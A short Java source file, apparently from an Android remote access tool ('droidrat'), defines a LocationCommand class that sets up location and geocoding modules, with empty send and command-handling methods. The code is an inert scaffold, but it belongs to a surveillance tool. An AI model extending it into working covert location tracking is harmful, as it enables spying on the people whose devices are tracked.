package com.je_chen.droidrat_je.command;

import android.content.Context;
import android.location.LocationManager;

import com.je_chen.droidrat_je.rat.command.process_super.CommandFather;
import com.je_chen.droidrat_je.rat.command.process_super.CommandProcessInterface;
import com.je_chen.droidrat_je.rat.modules.location.LocationGeocoder;
import com.je_chen.droidrat_je.rat.modules.location.LocationSystem;


public class LocationCommand extends CommandFather implements CommandProcessInterface {

    private LocationSystem locationSystem;
    private LocationGeocoder locationGeocoder;

    public LocationCommand(Context context,LocationManager locationManager, String type, int sec, int meter){
        locationSystem = new LocationSystem(locationManager,type,sec,meter);
        locationGeocoder = new LocationGeocoder(context);
    }

    @Override
    public void send(String value) {

    }

    @Override
    public void processCommand(String command) {

    }
}
